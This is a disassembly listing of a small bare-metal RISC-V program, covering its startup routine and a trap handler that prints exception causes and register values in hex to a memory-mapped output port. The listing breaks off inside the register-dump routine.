
code.elf:     file format elf32-littleriscv


Disassembly of section .text:

00001000 <_start>:
    1000:	0100006f          	j	1010 <_init>

00001004 <_end>:
    1004:	0000006f          	j	1004 <_end>

00001008 <_call_main>:
    1008:	6f4010ef          	jal	26fc <main>
    100c:	ff9ff06f          	j	1004 <_end>

00001010 <_init>:
    1010:	00000517          	auipc	a0,0x0
    1014:	09850513          	addi	a0,a0,152 # 10a8 <trap_vector>
    1018:	30551073          	csrw	mtvec,a0
    101c:	80020137          	lui	sp,0x80020
    1020:	285000ef          	jal	1aa4 <_load>
    1024:	00000093          	li	ra,0
    1028:	00000113          	li	sp,0
    102c:	00000193          	li	gp,0
    1030:	00000213          	li	tp,0
    1034:	00000293          	li	t0,0
    1038:	00000313          	li	t1,0
    103c:	00000393          	li	t2,0
    1040:	00000413          	li	s0,0
    1044:	00000493          	li	s1,0
    1048:	00000513          	li	a0,0
    104c:	00000593          	li	a1,0
    1050:	00000613          	li	a2,0
    1054:	00000693          	li	a3,0
    1058:	00000713          	li	a4,0
    105c:	00000793          	li	a5,0
    1060:	00000813          	li	a6,0
    1064:	00000893          	li	a7,0
    1068:	00000913          	li	s2,0
    106c:	00000993          	li	s3,0
    1070:	00000a13          	li	s4,0
    1074:	00000a93          	li	s5,0
    1078:	00000b13          	li	s6,0
    107c:	00000b93          	li	s7,0
    1080:	00000c13          	li	s8,0
    1084:	00000c93          	li	s9,0
    1088:	00000d13          	li	s10,0
    108c:	00000d93          	li	s11,0
    1090:	00000e13          	li	t3,0
    1094:	00000e93          	li	t4,0
    1098:	00000f13          	li	t5,0
    109c:	00000f93          	li	t6,0
    10a0:	80020137          	lui	sp,0x80020
    10a4:	f65ff06f          	j	1008 <_call_main>

000010a8 <trap_vector>:
    10a8:	f8010113          	addi	sp,sp,-128 # 8001ff80 <__bss_end+0x19ad0>
    10ac:	00012023          	sw	zero,0(sp)
    10b0:	00112223          	sw	ra,4(sp)
    10b4:	00212423          	sw	sp,8(sp)
    10b8:	00312623          	sw	gp,12(sp)
    10bc:	00412823          	sw	tp,16(sp)
    10c0:	00512a23          	sw	t0,20(sp)
    10c4:	00612c23          	sw	t1,24(sp)
    10c8:	00712e23          	sw	t2,28(sp)
    10cc:	02812023          	sw	s0,32(sp)
    10d0:	02912223          	sw	s1,36(sp)
    10d4:	02a12423          	sw	a0,40(sp)
    10d8:	02b12623          	sw	a1,44(sp)
    10dc:	02c12823          	sw	a2,48(sp)
    10e0:	02d12a23          	sw	a3,52(sp)
    10e4:	02e12c23          	sw	a4,56(sp)
    10e8:	02f12e23          	sw	a5,60(sp)
    10ec:	05012023          	sw	a6,64(sp)
    10f0:	05112223          	sw	a7,68(sp)
    10f4:	05212423          	sw	s2,72(sp)
    10f8:	05312623          	sw	s3,76(sp)
    10fc:	05412823          	sw	s4,80(sp)
    1100:	05512a23          	sw	s5,84(sp)
    1104:	05612c23          	sw	s6,88(sp)
    1108:	05712e23          	sw	s7,92(sp)
    110c:	07812023          	sw	s8,96(sp)
    1110:	07912223          	sw	s9,100(sp)
    1114:	07a12423          	sw	s10,104(sp)
    1118:	07b12623          	sw	s11,108(sp)
    111c:	07c12823          	sw	t3,112(sp)
    1120:	07d12a23          	sw	t4,116(sp)
    1124:	07e12c23          	sw	t5,120(sp)
    1128:	07f12e23          	sw	t6,124(sp)
    112c:	7ffff517          	auipc	a0,0x7ffff
    1130:	ed450513          	addi	a0,a0,-300 # 80000000 <__data_start>
    1134:	00050293          	mv	t0,a0
    1138:	40002337          	lui	t1,0x40002
    113c:	0002c503          	lbu	a0,0(t0)
    1140:	00128293          	addi	t0,t0,1
    1144:	00050663          	beqz	a0,1150 <trap_vector+0xa8>
    1148:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    114c:	ff1ff06f          	j	113c <trap_vector+0x94>
    1150:	7ffff517          	auipc	a0,0x7ffff
    1154:	ed050513          	addi	a0,a0,-304 # 80000020 <__data_start+0x20>
    1158:	00050293          	mv	t0,a0
    115c:	40002337          	lui	t1,0x40002
    1160:	0002c503          	lbu	a0,0(t0)
    1164:	00128293          	addi	t0,t0,1
    1168:	00050663          	beqz	a0,1174 <trap_vector+0xcc>
    116c:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    1170:	ff1ff06f          	j	1160 <trap_vector+0xb8>
    1174:	34202573          	csrr	a0,mcause
    1178:	7ffff297          	auipc	t0,0x7ffff
    117c:	eb828293          	addi	t0,t0,-328 # 80000030 <__data_start+0x30>
    1180:	0012a023          	sw	ra,0(t0)
    1184:	00a2a223          	sw	a0,4(t0)
    1188:	00b2a423          	sw	a1,8(t0)
    118c:	00050513          	mv	a0,a0
    1190:	00050593          	mv	a1,a0
    1194:	01855513          	srli	a0,a0,0x18
    1198:	00050513          	mv	a0,a0
    119c:	00050313          	mv	t1,a0
    11a0:	00435513          	srli	a0,t1,0x4
    11a4:	00f57513          	andi	a0,a0,15
    11a8:	7ffff297          	auipc	t0,0x7ffff
    11ac:	e9828293          	addi	t0,t0,-360 # 80000040 <__data_start+0x40>
    11b0:	00550533          	add	a0,a0,t0
    11b4:	00054503          	lbu	a0,0(a0)
    11b8:	400022b7          	lui	t0,0x40002
    11bc:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    11c0:	00f37513          	andi	a0,t1,15
    11c4:	7ffff297          	auipc	t0,0x7ffff
    11c8:	e7c28293          	addi	t0,t0,-388 # 80000040 <__data_start+0x40>
    11cc:	00550533          	add	a0,a0,t0
    11d0:	00054503          	lbu	a0,0(a0)
    11d4:	400022b7          	lui	t0,0x40002
    11d8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    11dc:	00058513          	mv	a0,a1
    11e0:	01055513          	srli	a0,a0,0x10
    11e4:	00050513          	mv	a0,a0
    11e8:	00050313          	mv	t1,a0
    11ec:	00435513          	srli	a0,t1,0x4
    11f0:	00f57513          	andi	a0,a0,15
    11f4:	7ffff297          	auipc	t0,0x7ffff
    11f8:	e6c28293          	addi	t0,t0,-404 # 80000060 <__data_start+0x60>
    11fc:	00550533          	add	a0,a0,t0
    1200:	00054503          	lbu	a0,0(a0)
    1204:	400022b7          	lui	t0,0x40002
    1208:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    120c:	00f37513          	andi	a0,t1,15
    1210:	7ffff297          	auipc	t0,0x7ffff
    1214:	e5028293          	addi	t0,t0,-432 # 80000060 <__data_start+0x60>
    1218:	00550533          	add	a0,a0,t0
    121c:	00054503          	lbu	a0,0(a0)
    1220:	400022b7          	lui	t0,0x40002
    1224:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1228:	00058513          	mv	a0,a1
    122c:	00855513          	srli	a0,a0,0x8
    1230:	00050513          	mv	a0,a0
    1234:	00050313          	mv	t1,a0
    1238:	00435513          	srli	a0,t1,0x4
    123c:	00f57513          	andi	a0,a0,15
    1240:	7ffff297          	auipc	t0,0x7ffff
    1244:	e4028293          	addi	t0,t0,-448 # 80000080 <__data_start+0x80>
    1248:	00550533          	add	a0,a0,t0
    124c:	00054503          	lbu	a0,0(a0)
    1250:	400022b7          	lui	t0,0x40002
    1254:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1258:	00f37513          	andi	a0,t1,15
    125c:	7ffff297          	auipc	t0,0x7ffff
    1260:	e2428293          	addi	t0,t0,-476 # 80000080 <__data_start+0x80>
    1264:	00550533          	add	a0,a0,t0
    1268:	00054503          	lbu	a0,0(a0)
    126c:	400022b7          	lui	t0,0x40002
    1270:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1274:	00058513          	mv	a0,a1
    1278:	00050513          	mv	a0,a0
    127c:	00050313          	mv	t1,a0
    1280:	00435513          	srli	a0,t1,0x4
    1284:	00f57513          	andi	a0,a0,15
    1288:	7ffff297          	auipc	t0,0x7ffff
    128c:	e1828293          	addi	t0,t0,-488 # 800000a0 <__data_start+0xa0>
    1290:	00550533          	add	a0,a0,t0
    1294:	00054503          	lbu	a0,0(a0)
    1298:	400022b7          	lui	t0,0x40002
    129c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    12a0:	00f37513          	andi	a0,t1,15
    12a4:	7ffff297          	auipc	t0,0x7ffff
    12a8:	dfc28293          	addi	t0,t0,-516 # 800000a0 <__data_start+0xa0>
    12ac:	00550533          	add	a0,a0,t0
    12b0:	00054503          	lbu	a0,0(a0)
    12b4:	400022b7          	lui	t0,0x40002
    12b8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    12bc:	7ffff297          	auipc	t0,0x7ffff
    12c0:	de428293          	addi	t0,t0,-540 # 800000a0 <__data_start+0xa0>
    12c4:	0002a083          	lw	ra,0(t0)
    12c8:	0042a503          	lw	a0,4(t0)
    12cc:	0082a583          	lw	a1,8(t0)
    12d0:	7ffff517          	auipc	a0,0x7ffff
    12d4:	df050513          	addi	a0,a0,-528 # 800000c0 <__data_start+0xc0>
    12d8:	00050293          	mv	t0,a0
    12dc:	40002337          	lui	t1,0x40002
    12e0:	0002c503          	lbu	a0,0(t0)
    12e4:	00128293          	addi	t0,t0,1
    12e8:	00050663          	beqz	a0,12f4 <trap_vector+0x24c>
    12ec:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    12f0:	ff1ff06f          	j	12e0 <trap_vector+0x238>
    12f4:	34102573          	csrr	a0,mepc
    12f8:	7ffff297          	auipc	t0,0x7ffff
    12fc:	dd828293          	addi	t0,t0,-552 # 800000d0 <__data_start+0xd0>
    1300:	0012a023          	sw	ra,0(t0)
    1304:	00a2a223          	sw	a0,4(t0)
    1308:	00b2a423          	sw	a1,8(t0)
    130c:	00050513          	mv	a0,a0
    1310:	00050593          	mv	a1,a0
    1314:	01855513          	srli	a0,a0,0x18
    1318:	00050513          	mv	a0,a0
    131c:	00050313          	mv	t1,a0
    1320:	00435513          	srli	a0,t1,0x4
    1324:	00f57513          	andi	a0,a0,15
    1328:	7ffff297          	auipc	t0,0x7ffff
    132c:	db828293          	addi	t0,t0,-584 # 800000e0 <__data_start+0xe0>
    1330:	00550533          	add	a0,a0,t0
    1334:	00054503          	lbu	a0,0(a0)
    1338:	400022b7          	lui	t0,0x40002
    133c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1340:	00f37513          	andi	a0,t1,15
    1344:	7ffff297          	auipc	t0,0x7ffff
    1348:	d9c28293          	addi	t0,t0,-612 # 800000e0 <__data_start+0xe0>
    134c:	00550533          	add	a0,a0,t0
    1350:	00054503          	lbu	a0,0(a0)
    1354:	400022b7          	lui	t0,0x40002
    1358:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    135c:	00058513          	mv	a0,a1
    1360:	01055513          	srli	a0,a0,0x10
    1364:	00050513          	mv	a0,a0
    1368:	00050313          	mv	t1,a0
    136c:	00435513          	srli	a0,t1,0x4
    1370:	00f57513          	andi	a0,a0,15
    1374:	7ffff297          	auipc	t0,0x7ffff
    1378:	d8c28293          	addi	t0,t0,-628 # 80000100 <__data_start+0x100>
    137c:	00550533          	add	a0,a0,t0
    1380:	00054503          	lbu	a0,0(a0)
    1384:	400022b7          	lui	t0,0x40002
    1388:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    138c:	00f37513          	andi	a0,t1,15
    1390:	7ffff297          	auipc	t0,0x7ffff
    1394:	d7028293          	addi	t0,t0,-656 # 80000100 <__data_start+0x100>
    1398:	00550533          	add	a0,a0,t0
    139c:	00054503          	lbu	a0,0(a0)
    13a0:	400022b7          	lui	t0,0x40002
    13a4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    13a8:	00058513          	mv	a0,a1
    13ac:	00855513          	srli	a0,a0,0x8
    13b0:	00050513          	mv	a0,a0
    13b4:	00050313          	mv	t1,a0
    13b8:	00435513          	srli	a0,t1,0x4
    13bc:	00f57513          	andi	a0,a0,15
    13c0:	7ffff297          	auipc	t0,0x7ffff
    13c4:	d6028293          	addi	t0,t0,-672 # 80000120 <__data_start+0x120>
    13c8:	00550533          	add	a0,a0,t0
    13cc:	00054503          	lbu	a0,0(a0)
    13d0:	400022b7          	lui	t0,0x40002
    13d4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    13d8:	00f37513          	andi	a0,t1,15
    13dc:	7ffff297          	auipc	t0,0x7ffff
    13e0:	d4428293          	addi	t0,t0,-700 # 80000120 <__data_start+0x120>
    13e4:	00550533          	add	a0,a0,t0
    13e8:	00054503          	lbu	a0,0(a0)
    13ec:	400022b7          	lui	t0,0x40002
    13f0:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    13f4:	00058513          	mv	a0,a1
    13f8:	00050513          	mv	a0,a0
    13fc:	00050313          	mv	t1,a0
    1400:	00435513          	srli	a0,t1,0x4
    1404:	00f57513          	andi	a0,a0,15
    1408:	7ffff297          	auipc	t0,0x7ffff
    140c:	d3828293          	addi	t0,t0,-712 # 80000140 <__data_start+0x140>
    1410:	00550533          	add	a0,a0,t0
    1414:	00054503          	lbu	a0,0(a0)
    1418:	400022b7          	lui	t0,0x40002
    141c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1420:	00f37513          	andi	a0,t1,15
    1424:	7ffff297          	auipc	t0,0x7ffff
    1428:	d1c28293          	addi	t0,t0,-740 # 80000140 <__data_start+0x140>
    142c:	00550533          	add	a0,a0,t0
    1430:	00054503          	lbu	a0,0(a0)
    1434:	400022b7          	lui	t0,0x40002
    1438:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    143c:	7ffff297          	auipc	t0,0x7ffff
    1440:	d0428293          	addi	t0,t0,-764 # 80000140 <__data_start+0x140>
    1444:	0002a083          	lw	ra,0(t0)
    1448:	0042a503          	lw	a0,4(t0)
    144c:	0082a583          	lw	a1,8(t0)
    1450:	7ffff517          	auipc	a0,0x7ffff
    1454:	d1050513          	addi	a0,a0,-752 # 80000160 <__data_start+0x160>
    1458:	00050293          	mv	t0,a0
    145c:	40002337          	lui	t1,0x40002
    1460:	0002c503          	lbu	a0,0(t0)
    1464:	00128293          	addi	t0,t0,1
    1468:	00050663          	beqz	a0,1474 <trap_vector+0x3cc>
    146c:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    1470:	ff1ff06f          	j	1460 <trap_vector+0x3b8>
    1474:	34302573          	csrr	a0,mtval
    1478:	7ffff297          	auipc	t0,0x7ffff
    147c:	cf828293          	addi	t0,t0,-776 # 80000170 <__data_start+0x170>
    1480:	0012a023          	sw	ra,0(t0)
    1484:	00a2a223          	sw	a0,4(t0)
    1488:	00b2a423          	sw	a1,8(t0)
    148c:	00050513          	mv	a0,a0
    1490:	00050593          	mv	a1,a0
    1494:	01855513          	srli	a0,a0,0x18
    1498:	00050513          	mv	a0,a0
    149c:	00050313          	mv	t1,a0
    14a0:	00435513          	srli	a0,t1,0x4
    14a4:	00f57513          	andi	a0,a0,15
    14a8:	7ffff297          	auipc	t0,0x7ffff
    14ac:	cd828293          	addi	t0,t0,-808 # 80000180 <__data_start+0x180>
    14b0:	00550533          	add	a0,a0,t0
    14b4:	00054503          	lbu	a0,0(a0)
    14b8:	400022b7          	lui	t0,0x40002
    14bc:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    14c0:	00f37513          	andi	a0,t1,15
    14c4:	7ffff297          	auipc	t0,0x7ffff
    14c8:	cbc28293          	addi	t0,t0,-836 # 80000180 <__data_start+0x180>
    14cc:	00550533          	add	a0,a0,t0
    14d0:	00054503          	lbu	a0,0(a0)
    14d4:	400022b7          	lui	t0,0x40002
    14d8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    14dc:	00058513          	mv	a0,a1
    14e0:	01055513          	srli	a0,a0,0x10
    14e4:	00050513          	mv	a0,a0
    14e8:	00050313          	mv	t1,a0
    14ec:	00435513          	srli	a0,t1,0x4
    14f0:	00f57513          	andi	a0,a0,15
    14f4:	7ffff297          	auipc	t0,0x7ffff
    14f8:	cac28293          	addi	t0,t0,-852 # 800001a0 <__data_start+0x1a0>
    14fc:	00550533          	add	a0,a0,t0
    1500:	00054503          	lbu	a0,0(a0)
    1504:	400022b7          	lui	t0,0x40002
    1508:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    150c:	00f37513          	andi	a0,t1,15
    1510:	7ffff297          	auipc	t0,0x7ffff
    1514:	c9028293          	addi	t0,t0,-880 # 800001a0 <__data_start+0x1a0>
    1518:	00550533          	add	a0,a0,t0
    151c:	00054503          	lbu	a0,0(a0)
    1520:	400022b7          	lui	t0,0x40002
    1524:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1528:	00058513          	mv	a0,a1
    152c:	00855513          	srli	a0,a0,0x8
    1530:	00050513          	mv	a0,a0
    1534:	00050313          	mv	t1,a0
    1538:	00435513          	srli	a0,t1,0x4
    153c:	00f57513          	andi	a0,a0,15
    1540:	7ffff297          	auipc	t0,0x7ffff
    1544:	c8028293          	addi	t0,t0,-896 # 800001c0 <__data_start+0x1c0>
    1548:	00550533          	add	a0,a0,t0
    154c:	00054503          	lbu	a0,0(a0)
    1550:	400022b7          	lui	t0,0x40002
    1554:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1558:	00f37513          	andi	a0,t1,15
    155c:	7ffff297          	auipc	t0,0x7ffff
    1560:	c6428293          	addi	t0,t0,-924 # 800001c0 <__data_start+0x1c0>
    1564:	00550533          	add	a0,a0,t0
    1568:	00054503          	lbu	a0,0(a0)
    156c:	400022b7          	lui	t0,0x40002
    1570:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1574:	00058513          	mv	a0,a1
    1578:	00050513          	mv	a0,a0
    157c:	00050313          	mv	t1,a0
    1580:	00435513          	srli	a0,t1,0x4
    1584:	00f57513          	andi	a0,a0,15
    1588:	7ffff297          	auipc	t0,0x7ffff
    158c:	c5828293          	addi	t0,t0,-936 # 800001e0 <__data_start+0x1e0>
    1590:	00550533          	add	a0,a0,t0
    1594:	00054503          	lbu	a0,0(a0)
    1598:	400022b7          	lui	t0,0x40002
    159c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    15a0:	00f37513          	andi	a0,t1,15
    15a4:	7ffff297          	auipc	t0,0x7ffff
    15a8:	c3c28293          	addi	t0,t0,-964 # 800001e0 <__data_start+0x1e0>
    15ac:	00550533          	add	a0,a0,t0
    15b0:	00054503          	lbu	a0,0(a0)
    15b4:	400022b7          	lui	t0,0x40002
    15b8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    15bc:	7ffff297          	auipc	t0,0x7ffff
    15c0:	c2428293          	addi	t0,t0,-988 # 800001e0 <__data_start+0x1e0>
    15c4:	0002a083          	lw	ra,0(t0)
    15c8:	0042a503          	lw	a0,4(t0)
    15cc:	0082a583          	lw	a1,8(t0)
    15d0:	7ffff517          	auipc	a0,0x7ffff
    15d4:	c3050513          	addi	a0,a0,-976 # 80000200 <__data_start+0x200>
    15d8:	00050293          	mv	t0,a0
    15dc:	40002337          	lui	t1,0x40002
    15e0:	0002c503          	lbu	a0,0(t0)
    15e4:	00128293          	addi	t0,t0,1
    15e8:	00050663          	beqz	a0,15f4 <trap_vector+0x54c>
    15ec:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    15f0:	ff1ff06f          	j	15e0 <trap_vector+0x538>
    15f4:	00000393          	li	t2,0
    15f8:	08000e13          	li	t3,128

000015fc <trap_dump_registers>:
    15fc:	0023d513          	srli	a0,t2,0x2
    1600:	7ffff297          	auipc	t0,0x7ffff
    1604:	c1028293          	addi	t0,t0,-1008 # 80000210 <__data_start+0x210>
    1608:	0012a023          	sw	ra,0(t0)
    160c:	00a2a223          	sw	a0,4(t0)
    1610:	00b2a423          	sw	a1,8(t0)
    1614:	00050513          	mv	a0,a0
    1618:	00050593          	mv	a1,a0
    161c:	01855513          	srli	a0,a0,0x18
    1620:	00050513          	mv	a0,a0
    1624:	00050313          	mv	t1,a0
    1628:	00435513          	srli	a0,t1,0x4
    162c:	00f57513          	andi	a0,a0,15
    1630:	7ffff297          	auipc	t0,0x7ffff
    1634:	bf028293          	addi	t0,t0,-1040 # 80000220 <__data_start+0x220>
    1638:	00550533          	add	a0,a0,t0
    163c:	00054503          	lbu	a0,0(a0)
    1640:	400022b7          	lui	t0,0x40002
    1644:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1648:	00f37513          	andi	a0,t1,15
    164c:	7ffff297          	auipc	t0,0x7ffff
    1650:	bd428293          	addi	t0,t0,-1068 # 80000220 <__data_start+0x220>
    1654:	00550533          	add	a0,a0,t0
    1658:	00054503          	lbu	a0,0(a0)
    165c:	400022b7          	lui	t0,0x40002
    1660:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1664:	00058513          	mv	a0,a1
    1668:	01055513          	srli	a0,a0,0x10
    166c:	00050513          	mv	a0,a0
    1670:	00050313          	mv	t1,a0
    1674:	00435513          	srli	a0,t1,0x4
    1678:	00f57513          	andi	a0,a0,15
    167c:	7ffff297          	auipc	t0,0x7ffff
    1680:	bc428293          	addi	t0,t0,-1084 # 80000240 <__data_start+0x240>
    1684:	00550533          	add	a0,a0,t0
    1688:	00054503          	lbu	a0,0(a0)
    168c:	400022b7          	lui	t0,0x40002
    1690:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1694:	00f37513          	andi	a0,t1,15
    1698:	7ffff297          	auipc	t0,0x7ffff
    169c:	ba828293          	addi	t0,t0,-1112 # 80000240 <__data_start+0x240>
    16a0:	00550533          	add	a0,a0,t0
    16a4:	00054503          	lbu	a0,0(a0)
    16a8:	400022b7          	lui	t0,0x40002
    16ac:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    16b0:	00058513          	mv	a0,a1
    16b4:	00855513          	srli	a0,a0,0x8
    16b8:	00050513          	mv	a0,a0
    16bc:	00050313          	mv	t1,a0
    16c0:	00435513          	srli	a0,t1,0x4
    16c4:	00f57513          	andi	a0,a0,15
    16c8:	7ffff297          	auipc	t0,0x7ffff
    16cc:	b9828293          	addi	t0,t0,-1128 # 80000260 <__data_start+0x260>
    16d0:	00550533          	add	a0,a0,t0
    16d4:	00054503          	lbu	a0,0(a0)
    16d8:	400022b7          	lui	t0,0x40002
    16dc:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    16e0:	00f37513          	andi	a0,t1,15
    16e4:	7ffff297          	auipc	t0,0x7ffff
    16e8:	b7c28293          	addi	t0,t0,-1156 # 80000260 <__data_start+0x260>
    16ec:	00550533          	add	a0,a0,t0
    16f0:	00054503          	lbu	a0,0(a0)
    16f4:	400022b7          	lui	t0,0x40002
    16f8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    16fc:	00058513          	mv	a0,a1
    1700:	00050513          	mv	a0,a0
    1704:	00050313          	mv	t1,a0
    1708:	00435513          	srli	a0,t1,0x4
    170c:	00f57513          	andi	a0,a0,15
    1710:	7ffff297          	auipc	t0,0x7ffff
    1714:	b7028293          	addi	t0,t0,-1168 # 80000280 <__data_start+0x280>
    1718:	00550533          	add	a0,a0,t0
    171c:	00054503          	lbu	a0,0(a0)
    1720:	400022b7          	lui	t0,0x40002
    1724:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1728:	00f37513          	andi	a0,t1,15
    172c:	7ffff297          	auipc	t0,0x7ffff
    1730:	b5428293          	addi	t0,t0,-1196 # 80000280 <__data_start+0x280>
    1734:	00550533          	add	a0,a0,t0
    1738:	00054503          	lbu	a0,0(a0)
    173c:	400022b7          	lui	t0,0x40002
    1740:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1744:	7ffff297          	auipc	t0,0x7ffff
    1748:	b3c28293          	addi	t0,t0,-1220 # 80000280 <__data_start+0x280>
    174c:	0002a083          	lw	ra,0(t0)
    1750:	0042a503          	lw	a0,4(t0)
    1754:	0082a583          	lw	a1,8(t0)
    1758:	7ffff517          	auipc	a0,0x7ffff
    175c:	b4850513          	addi	a0,a0,-1208 # 800002a0 <__data_start+0x2a0>
    1760:	00050293          	mv	t0,a0
    1764:	40002337          	lui	t1,0x40002
    1768:	0002c503          	lbu	a0,0(t0)
    176c:	00128293          	addi	t0,t0,1
    1770:	00050663          	beqz	a0,177c <trap_dump_registers+0x180>
    1774:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4fa>
    1778:	ff1ff06f          	j	1768 <trap_dump_registers+0x16c>
    177c:	00238533          	add	a0,t2,sp
    1780:	00052503          	lw	a0,0(a0)
    1784:	7ffff297          	auipc	t0,0x7ffff
    1788:	b2c28293          	addi	t0,t0,-1236 # 800002b0 <__data_start+0x2b0>
    178c:	0012a023          	sw	ra,0(t0)
    1790:	00a2a223          	sw	a0,4(t0)
    1794:	00b2a423          	sw	a1,8(t0)
    1798:	00050513          	mv	a0,a0
    179c:	00050593          	mv	a1,a0
    17a0:	01855513          	srli	a0,a0,0x18
    17a4:	00050513          	mv	a0,a0
    17a8:	00050313          	mv	t1,a0
    17ac:	00435513          	srli	a0,t1,0x4
    17b0:	00f57513          	andi	a0,a0,15
    17b4:	7ffff297          	auipc	t0,0x7ffff
    17b8:	b0c28293          	addi	t0,t0,-1268 # 800002c0 <__data_start+0x2c0>
    17bc:	00550533          	add	a0,a0,t0
    17c0:	00054503          	lbu	a0,0(a0)
    17c4:	400022b7          	lui	t0,0x40002
    17c8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    17cc:	00f37513          	andi	a0,t1,15
    17d0:	7ffff297          	auipc	t0,0x7ffff
    17d4:	af028293          	addi	t0,t0,-1296 # 800002c0 <__data_start+0x2c0>
    17d8:	00550533          	add	a0,a0,t0
    17dc:	00054503          	lbu	a0,0(a0)
    17e0:	400022b7          	lui	t0,0x40002
    17e4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    17e8:	00058513          	mv	a0,a1
    17ec:	01055513          	srli	a0,a0,0x10
    17f0:	00050513          	mv	a0,a0
    17f4:	00050313          	mv	t1,a0
    17f8:	00435513          	srli	a0,t1,0x4
    17fc:	00f57513          	andi	a0,a0,15
    1800:	7ffff297          	auipc	t0,0x7ffff
    1804:	ae028293          	addi	t0,t0,-1312 # 800002e0 <__data_start+0x2e0>
    1808:	00550533          	add	a0,a0,t0
    180c:	00054503          	lbu	a0,0(a0)
    1810:	400022b7          	lui	t0,0x40002
    1814:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1818:	00f37513          	andi	a0,t1,15
    181c:	7ffff297          	auipc	t0,0x7ffff
    1820:	ac428293          	addi	t0,t0,-1340 # 800002e0 <__data_start+0x2e0>
    1824:	00550533          	add	a0,a0,t0
    1828:	00054503          	lbu	a0,0(a0)
    182c:	400022b7          	lui	t0,0x40002
    1830:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1834:	00058513          	mv	a0,a1
    1838:	00855513          	srli	a0,a0,0x8
    183c:	00050513          	mv	a0,a0
    1840:	00050313          	mv	t1,a0
    1844:	00435513          	srli	a0,t1,0x4
    1848:	00f57513          	andi	a0,a0,15
    184c:	7ffff297          	auipc	t0,0x7ffff
    1850:	ab428293          	addi	t0,t0,-1356 # 80000300 <__data_start+0x300>
    1854:	00550533          	add	a0,a0,t0
    1858:	00054503          	lbu	a0,0(a0)
    185c:	400022b7          	lui	t0,0x40002
    1860:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1864:	00f37513          	andi	a0,t1,15
    1868:	7ffff297          	auipc	t0,0x7ffff
    186c:	a9828293          	addi	t0,t0,-1384 # 80000300 <__data_start+0x300>
    1870:	00550533          	add	a0,a0,t0
    1874:	00054503          	lbu	a0,0(a0)
    1878:	400022b7          	lui	t0,0x40002
    187c:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    1880:	00058513          	mv	a0,a1
    1884:	00050513          	mv	a0,a0
    1888:	00050313          	mv	t1,a0
    188c:	00435513          	srli	a0,t1,0x4
    1890:	00f57513          	andi	a0,a0,15
    1894:	7ffff297          	auipc	t0,0x7ffff
    1898:	a8c28293          	addi	t0,t0,-1396 # 80000320 <__data_start+0x320>
    189c:	00550533          	add	a0,a0,t0
    18a0:	00054503          	lbu	a0,0(a0)
    18a4:	400022b7          	lui	t0,0x40002
    18a8:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4fa>
    18ac:	00f37513          	andi	a0,t1,15
    18b0:	7ffff297          	auipc	t0,0x7ffff
    18b4:	a7028293          	addi	t0,t0,-1424 # 80000320 <__data_start+0x320>
    18b8:	00550533          	add	a0,a0,t0
    18bc:	00054503          	lbu	a0,0(a0)
    18c0:	400022b7          	lui	t0,0x40002
